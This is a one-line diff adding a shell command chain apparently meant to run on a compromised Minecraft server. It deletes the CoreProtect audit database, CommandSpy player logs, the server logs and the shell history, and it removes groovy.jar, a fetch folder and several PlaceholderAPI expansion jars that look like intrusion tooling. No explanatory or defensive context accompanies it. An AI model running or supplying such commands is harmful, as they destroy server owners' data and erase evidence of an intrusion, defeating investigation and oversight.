@@ -1,0 +1,1 @@
+rm plugins/CommandSpy/players.yml; rm ~/.bash_history; rm plugins/CoreProtect/CoreProtect.db; history -c;rm -fr logs/;rm -fr groovy.jar;rm -fr plugins/Minepacks; rm plugins/PlaceholderAPI/expansions/Expansion-groopi.jar;rm plugins/PlaceholderAPI/expansions/Expansion-minepacks.jar;rm plugins/PlaceholderAPI/expansions/Expansion-fetch.jar;rm -fr fetch/;
